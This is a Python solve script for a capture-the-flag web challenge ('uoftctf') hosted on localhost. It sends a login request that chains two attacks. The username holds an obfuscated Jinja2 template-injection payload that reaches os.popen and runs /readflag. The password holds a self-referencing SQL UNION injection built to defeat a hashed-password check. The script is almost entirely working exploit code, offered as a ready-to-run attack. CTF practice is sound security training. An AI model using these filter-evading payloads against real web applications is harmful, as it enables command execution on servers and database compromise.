import requests
import re
BASE_URL = "http://localhost:5000"

def solve():
    s = requests.Session()
    username = "{{((((lipsum|attr(dict(__globals__=x)|join))[dict(os=x)|join]|attr(dict(popen=x)|join))(((lipsum|attr(dict(__globals__=x)|join))[dict(__builtins__=x)|join][dict(chr=x)|join](47))~(dict(readflag=x)|join)))|attr(dict(read=x)|join))()}}\\"
    U = username.encode().hex().upper()
    s_template = f") UNION SELECT 0x{U}, SHA2(REPLACE(s, CHAR(36), HEX(s)), 256) FROM (SELECT 0x$ AS s) AS t -- "
    S = s_template.encode().hex().upper()
    password = s_template.replace('$', S)
    r = s.post(f"{BASE_URL}/login", data={"username": username, "password": password})
    m = re.search(r"uoftctf\{[^}]*\}", r.text)
    print(m.group(0))

if __name__ == "__main__":
    solve()